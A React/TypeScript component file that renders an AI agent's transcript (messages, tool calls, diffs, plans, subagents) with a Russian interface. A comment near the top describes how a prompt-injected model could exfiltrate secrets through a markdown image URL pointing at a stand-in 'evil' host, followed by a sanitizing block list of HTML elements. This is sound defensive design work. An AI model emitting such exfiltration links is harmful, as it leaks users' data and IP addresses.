// One transcript item (retinue/transcript.py `Item`) as the owner reads it, after Claude's desktop app: messages as
// markdown, every tool call one quiet muted line — an icon, a verb, its target — that opens on a tap to its input and
// result (the shape of Vercel AI Elements' Tool and prompt-kit's Steps, drawn on the native <details>: accessible and
// keyboard-ready with no state and no Radix). Reads grouped, edits as small diffs, the plan as a checklist, a subagent
// folded with its own steps. Runs of such lines are folded further by the transcript (`StepRun`).
import { memo, type ReactNode } from "react";
import { defaultRehypePlugins, Streamdown } from "streamdown";
import {
  AlertCircle,
  Bot,
  Check,
  ChevronRight,
  Circle,
  Clock,
  Dot,
  FileSearch,
  Globe,
  Layers,
  ListTodo,
  Pencil,
  Plug,
  Question,
  Terminal,
} from "@/components/icons";
import { oneLine, plural } from "@/lib/format";
import { type DiffRow, diffCounts, lineDiff } from "@/lib/linediff";
import type { ItemData } from "@/lib/types";
import { cn } from "@/lib/utils";

// Model text is untrusted (a prompt-injected model writes it). Nothing in it may load from the network by itself:
// no images (`![x](https://evil/?d=SECRET)` would leak data and the owner's IP with zero clicks, or draw a fake
// card), no raw HTML at all (no `<img>`, `<link rel=preload>`, `<iframe>`, `<style>`). Images become plain text:
// their alt and URL, not clickable. Links keep Streamdown's link-safety confirmation.
export const REHYPE = [defaultRehypePlugins.sanitize!, defaultRehypePlugins.harden!]; // no `raw`: HTML is never parsed
export const BLOCKED = [
  "picture", "source", "video", "audio", "track", "iframe", "frame", "frameset", "object", "embed", "link", "meta",
  "base", "script", "style", "svg", "image", "math", "form", "input", "button", "textarea", "select", "template", "portal",
];

export function ImageAsText({ alt, src }: { alt?: string; src?: unknown }) {
  return (
    <span data-testid="image-as-text" className="rounded bg-muted px-1 font-mono text-xs text-muted-foreground">
      [изображение{alt ? `: ${alt}` : ""}]{typeof src === "string" && src ? ` ${src}` : ""}
    </span>
  );
}

const COMPONENTS = { img: ImageAsText };

export function Markdown({ text, streaming = false }: { text: string; streaming?: boolean }) {
  return (
    <Streamdown
      className="markdown text-[15px] leading-relaxed md:text-sm"
      mode={streaming ? "streaming" : "static"}
      isAnimating={streaming}
      controls={false}
      skipHtml
      rehypePlugins={REHYPE}
      disallowedElements={BLOCKED}
      unwrapDisallowed
      components={COMPONENTS}
      linkSafety={{ enabled: true }}
    >
      {text}
    </Streamdown>
  );
}

/** One step: a single muted line, its details under it on a tap. 44 px to tap on a touch screen, 28 px to look at. */
export function Step({
  icon,
  verb,
  target,
  meta,
  tone,
  children,
  open,
}: {
  icon: ReactNode;
  verb: ReactNode;
  target?: ReactNode;
  meta?: ReactNode;
  tone?: "error" | "pending";
  children: ReactNode;
  open?: boolean;
}) {
  return (
    <details className="group/step min-w-0" open={open}>
      <summary
        className={cn(
          "-mx-1.5 flex h-7 cursor-pointer list-none items-center gap-2 rounded-md px-1.5 text-[13px] text-muted-foreground select-none hover:bg-accent/60 hover:text-foreground pointer-coarse:h-auto pointer-coarse:min-h-11",
          tone === "error" && "text-destructive hover:text-destructive",
        )}
      >
        <span className="shrink-0 [&_svg]:size-3.5">{icon}</span>
        <span className="shrink-0 text-foreground/80">{verb}</span>
        {target !== undefined && <span className="min-w-0 flex-1 truncate font-mono text-xs">{target}</span>}
        {target === undefined && <span className="flex-1" />}
        {meta && <span className="flex shrink-0 items-center gap-1.5 text-xs">{meta}</span>}
        <ChevronRight className="fold-chevron size-3 shrink-0 opacity-50 transition-transform group-hover/step:opacity-100" />
      </summary>
      <div className="mt-0.5 mb-2 ml-[0.4rem] flex min-w-0 flex-col gap-1.5 border-l pl-3.5">{children}</div>
    </details>
  );
}

/** A labelled block inside an open step: «Ввод», «Результат». */
function Labelled({ label, children }: { label: string; children: ReactNode }) {
  return (
    <div className="flex min-w-0 flex-col gap-1">
      <div className="text-[11px] tracking-wide text-muted-foreground uppercase">{label}</div>
      {children}
    </div>
  );
}

export function Pre({ children, className }: { children: ReactNode; className?: string }) {
  return (
    <pre
      className={cn(
        "max-h-72 overflow-auto rounded-md bg-muted/70 px-2.5 py-2 font-mono text-xs leading-snug whitespace-pre-wrap break-words",
        className,
      )}
    >
      {children}
    </pre>
  );
}

function Status({ ok, error }: { ok: boolean | null; error?: boolean }) {
  if (error || ok === false) return <span className="text-destructive">ошибка</span>;
  if (ok === null) return <span className="size-1.5 animate-pulse rounded-full bg-primary" aria-label="выполняется" role="img" />;
  return null;
}

export function DiffRows({ rows }: { rows: DiffRow[] }) {
  return (
    <div className="overflow-x-auto rounded-md border font-mono text-[12.5px] leading-snug">
      {rows.map((row, i) => (
        <div
          key={i}
          className={cn(
            "flex min-w-fit whitespace-pre",
            row.type === "+" && "bg-diff-add",
            row.type === "-" && "bg-diff-del",
            row.type === "…" && "bg-muted text-muted-foreground",
          )}
        >
          <span className="w-5 shrink-0 select-none text-center text-muted-foreground">
            {row.type === "…" ? "" : row.type}
          </span>
          <span className="pr-3">{row.text || " "}</span>
        </div>
      ))}
    </div>
  );
}

/** A path as a step's target, whole in the tooltip when the line cuts it. */
function PathTarget({ path }: { path: string }) {
  return <span title={path}>{path}</span>;
}

function EditItem({ data }: { data: Extract<ItemData, { kind: "edit" }>["data"] }) {
  const pairs = data.edits ?? (data.old !== undefined || data.new !== undefined ? [{ old: data.old ?? "", new: data.new ?? "" }] : []);
  const rows: DiffRow[] =
    pairs.length > 0
      ? pairs.flatMap((p, k) => [...(k ? [{ type: "…" as const, text: "" }] : []), ...lineDiff(p.old, p.new)])
      : lineDiff("", data.content ?? "");
  const shownRows = rows.slice(0, 400);
  const { added, removed } = diffCounts(rows);
  const verb = data.tool === "Write" ? "Записан" : "Правка";
  return (
    <Step
      icon={<Pencil />}
      verb={verb}
      target={<PathTarget path={data.path} />}
      meta={
        <>
          <span className="text-success">+{added}</span>
          <span className="text-destructive">−{removed}</span>
          <Status ok={data.ok} />
        </>
      }
      tone={data.ok === false ? "error" : undefined}
    >
      <DiffRows rows={shownRows} />
      {rows.length > shownRows.length && (
        <p className="text-xs text-muted-foreground">Ещё {rows.length - shownRows.length} строк — во вкладке «Изменения».</p>
      )}
      {data.error && <Pre className="text-destructive">{data.error}</Pre>}
    </Step>
  );
}

type Todos = NonNullable<Extract<ItemData, { kind: "plan" }>["data"]["todos"]>;

export function TodoList({ todos, small = false }: { todos: Todos; small?: boolean }) {
  return (
    <ul className={cn("flex flex-col", small ? "gap-1 text-[13px]" : "gap-1.5 text-sm")}>
      {todos.map((t, i) => (
        <li key={i} className="flex items-start gap-2">
          <span className="mt-0.5 shrink-0 [&_svg]:size-3.5">
            {t.status === "completed" ? (
              <Check className="text-success" />
            ) : t.status === "in_progress" ? (
              <Dot className="text-primary" />
            ) : (
              <Circle className="text-muted-foreground" />
            )}
          </span>
          <span
            className={cn(
              t.status === "completed" && "text-muted-foreground line-through",
              t.status === "in_progress" && "font-medium",
            )}
          >
            {t.status === "in_progress" && t.activeForm ? t.activeForm : t.content}
          </span>
        </li>
      ))}
    </ul>
  );
}

const TOOL_WORDS: Record<string, string> = { Read: "Прочитан", Grep: "Поиск", Glob: "Файлы" };

function input(tool: string, data: Record<string, unknown>): string {
  return tool === "Bash" && typeof data.command === "string" ? data.command : JSON.stringify(data, null, 2);
}

/** A tool's name as a verb: an MCP tool as «server · tool», the rest as the CLI names it. */
export function toolName(tool: string): string {
  const mcp = /^mcp__([^_]+(?:_[^_]+)*)__(.+)$/.exec(tool);
  return mcp ? `${mcp[1]} · ${mcp[2]}` : tool || "Вызов";
}

function iconOf(tool: string): ReactNode {
  if (tool.startsWith("mcp__")) return <Plug />;
  if (tool === "WebFetch" || tool === "WebSearch") return <Globe />;
  return <Terminal />;
}

/** The steps under a subagent: its own items, runs of calls folded as in the transcript. */
function Inner({ items }: { items: ItemData[] }) {
  return (
    <div className="flex min-w-0 flex-col gap-1">
      {runsOf(items.map((it) => isStep(it))).map((run) =>
        run.length > 1 ? (
          <StepRun key={run[0]} items={run.map((k) => items[k]!)} />
        ) : (
          <TranscriptItem key={run[0]} item={items[run[0]!]!} />
        ),
      )}
    </div>
  );
}

/** A call the transcript may fold with its neighbours: what the owner reads past, not what he answers. */
export function isStep(item: ItemData): boolean {
  return (
    item.kind === "reads" ||
    item.kind === "tool" ||
    item.kind === "edit" ||
    item.kind === "subagent" ||
    (item.kind === "plan" && !!item.data.todos)
  );
}

/** Indices grouped into runs: consecutive steps form one run, anything else is a run of its own. `steps[k]` says
 * whether item k may join a run. Pure, exported for tests. */
export function runsOf(steps: boolean[]): number[][] {
  const runs: number[][] = [];
  steps.forEach((step, k) => {
    const last = runs.at(-1);
    if (step && last && steps[last.at(-1)!]) last.push(k);
    else runs.push([k]);
  });
  return runs;
}

/** How many calls a step stands for, and what to call them in a run's tally. */
function tallyOf(items: ItemData[]): { count: number; words: string; errors: number; running: boolean } {
  const tally = new Map<string, number>();
  let count = 0;
  let errors = 0;
  let running = false;
  const add = (word: string, n = 1) => tally.set(word, (tally.get(word) ?? 0) + n);
  for (const it of items) {
    switch (it.kind) {
      case "reads":
        count += it.data.calls.length;
        add("прочитано", it.data.calls.length);
        errors += it.data.calls.filter((c) => c.error).length;
        break;
      case "edit":
        count += 1;
        add("правки");
        if (it.data.ok === false) errors += 1;
        if (it.data.ok === null) running = true;
        break;
      case "tool":
        count += 1;
        add(toolName(it.data.tool));
        if (it.data.error) errors += 1;
        if (it.data.result === null) running = true;
        break;
      case "subagent":
        count += 1;
        add("субагент");
        if (it.data.result === null) running = true;
        break;
      case "plan":
        count += 1;
        add("план");
        break;
      default:
        break;
    }
  }
  const words = [...tally].map(([w, n]) => (n > 1 ? `${w} ${n}` : w)).join(" · ");
  return { count, words, errors, running };
}

/** A run of consecutive calls folded into one line — «7 шагов · прочитано 4 · Bash 2 · правки» — as Claude's desktop
 * app folds a turn's tool calls. Open while the turn still runs it (`open`), folded once it is done. */
export function StepRun({ items, open }: { items: ItemData[]; open?: boolean }) {
  const { count, words, errors, running } = tallyOf(items);
  return (
    <Step
      icon={<Layers />}
      verb={`${count} ${plural(count, "шаг", "шага", "шагов")}`}
      target={<span className="font-sans text-[13px]">{words}</span>}
      meta={
        <>
          {errors > 0 && <span className="text-destructive">{`${errors} ${plural(errors, "ошибка", "ошибки", "ошибок")}`}</span>}
          {running && <span className="size-1.5 animate-pulse rounded-full bg-primary" role="img" aria-label="выполняется" />}
        </>
      }
      open={open}
    >
      <div data-testid="step-run" className="flex min-w-0 flex-col gap-0.5">
        {items.map((it, i) => (
          <TranscriptItem key={i} item={it} />
        ))}
      </div>
    </Step>
  );
}

export const TranscriptItem = memo(function TranscriptItem({ item }: { item: ItemData }) {
  switch (item.kind) {
    case "message":
      return item.data.role === "user" ? (
        <div className="ml-auto max-w-[85%] rounded-2xl bg-bubble px-3.5 py-2 text-[15px] whitespace-pre-wrap break-words md:text-sm">
          {item.data.text}
        </div>
      ) : (
        <div className="min-w-0">
          <Markdown text={item.data.text} />
        </div>
      );
    case "reads": {
      const calls = item.data.calls;
      const tally = new Map<string, number>();
      for (const c of calls) tally.set(c.tool, (tally.get(c.tool) ?? 0) + 1);
      const counts = [...tally].map(([tool, n]) => (n > 1 ? `${tool} ×${n}` : tool)).join(", ");
      const failed = calls.some((c) => c.error);
      return (
        <Step
          icon={<FileSearch />}
          verb={`Прочитано: ${calls.length} ${plural(calls.length, "вызов", "вызова", "вызовов")}`}
          target={calls.length === 1 ? oneLine(calls[0]!.tool, calls[0]!.input) : undefined}
          meta={<span className="text-muted-foreground">{counts}</span>}
          tone={failed ? "error" : undefined}
        >
          {calls.map((c) => (
            <details key={c.id} className="group/call min-w-0">
              <summary
                className={cn(
                  "flex h-6 cursor-pointer list-none items-center gap-2 text-xs pointer-coarse:min-h-11",
                  c.error ? "text-destructive" : "text-muted-foreground hover:text-foreground",
                )}
              >
                <span className="shrink-0">{TOOL_WORDS[c.tool] ?? c.tool}</span>
                <span className="min-w-0 truncate font-mono">{oneLine(c.tool, c.input)}</span>
              </summary>
              {c.result !== null && <Pre className="mb-1">{c.result}</Pre>}
            </details>
          ))}
        </Step>
      );
    }
    case "edit":
      return <EditItem data={item.data} />;
    case "plan": {
      if (!item.data.todos)
        return (
          <div className="rounded-lg border bg-card px-3 py-2.5">
            <div className="mb-1.5 flex items-center gap-2 text-[13px] font-medium [&_svg]:size-3.5">
              <ListTodo /> План на утверждение
            </div>
            <Markdown text={item.data.plan ?? ""} />
          </div>
        );
      const todos = item.data.todos;
      const done = todos.filter((t) => t.status === "completed").length;
      return (
        <Step icon={<ListTodo />} verb="План" target={<span className="font-sans text-[13px]">{`${done} из ${todos.length}`}</span>}>
          <TodoList todos={todos} small />
        </Step>
      );
    }
    case "subagent": {
      const steps = item.data.items.filter(isStep).length;
      return (
        <Step
          icon={<Bot />}
          verb={<span>{`Субагент · ${item.data.agent || item.data.tool}: ${item.data.description}`}</span>}
          meta={
            item.data.result === null ? (
              <span className="flex items-center gap-1.5 text-muted-foreground">
                <span className="size-1.5 animate-pulse rounded-full bg-primary" /> работает
              </span>
            ) : (
              <span className="text-muted-foreground">{`${steps} ${plural(steps, "шаг", "шага", "шагов")}`}</span>
            )
          }
        >
          <details className="min-w-0">
            <summary className="flex h-6 cursor-pointer list-none items-center text-xs text-muted-foreground hover:text-foreground pointer-coarse:min-h-11">
              Задание
            </summary>
            <Pre>{item.data.prompt}</Pre>
          </details>
          <Inner items={item.data.items} />
          {item.data.result !== null && (
            <Labelled label="Ответ субагента">
              <div className="rounded-md bg-muted/70 px-2.5 py-2">
                <Markdown text={item.data.result} />
              </div>
            </Labelled>
          )}
        </Step>
      );
    }
    case "question":
      return (
        <div className="rounded-lg border bg-card px-3 py-2.5 text-sm">
          <div className="mb-1.5 flex items-center gap-2 text-[13px] font-medium [&_svg]:size-3.5">
            <Question /> Вопрос
          </div>
          {item.data.questions.map((q, i) => (
            <div key={i} className="mb-2">
              {q.header && <div className="text-[11px] text-muted-foreground uppercase">{q.header}</div>}
              <div className="font-medium">{q.question}</div>
              {q.options && (
                <ul className="mt-1 flex flex-wrap gap-1">
                  {q.options.map((o, k) => (
                    <li key={k} title={o.description} className="rounded-full border px-2 py-0.5 text-xs">
                      {o.label}
                    </li>
                  ))}
                </ul>
              )}
            </div>
          ))}
          {item.data.answer !== null ? (
            <div className="text-[13px]">
              <span className="text-muted-foreground">Ответ: </span>
              {item.data.answer}
            </div>
          ) : (
            <div className="text-[13px] text-muted-foreground">Ждёт ответа — в карточке вопроса.</div>
          )}
        </div>
      );
    case "tool":
      return (
        <Step
          icon={iconOf(item.data.tool)}
          verb={toolName(item.data.tool)}
          target={oneLine(item.data.tool, item.data.input)}
          meta={<Status ok={item.data.result === null ? null : !item.data.error} error={item.data.error} />}
          tone={item.data.error ? "error" : undefined}
        >
          <Labelled label="Ввод">
            <Pre>{input(item.data.tool, item.data.input)}</Pre>
          </Labelled>
          {item.data.result !== null && (
            <Labelled label={item.data.error ? "Ошибка" : "Результат"}>
              <Pre className={cn(item.data.error && "text-destructive")}>{item.data.result || "(пусто)"}</Pre>
            </Labelled>
          )}
        </Step>
      );
    case "result": {
      const d = item.data;
      // A turn that simply ended says nothing: its summary marks the end. An error or a stop on a card does.
      if (!d.is_error && d.stop_reason !== "tool_deferred") return null;
      const word = d.is_error ? `Ход оборвался ошибкой${d.text ? `: ${d.text}` : ""}` : "Остановлено: ждёт решения по вызову";
      return (
        <div className={cn("flex items-center gap-1.5 text-xs text-muted-foreground [&_svg]:size-3.5", d.is_error && "text-destructive")}>
          {d.is_error ? <AlertCircle /> : <Clock />}
          {word}
        </div>
      );
    }
  }
});
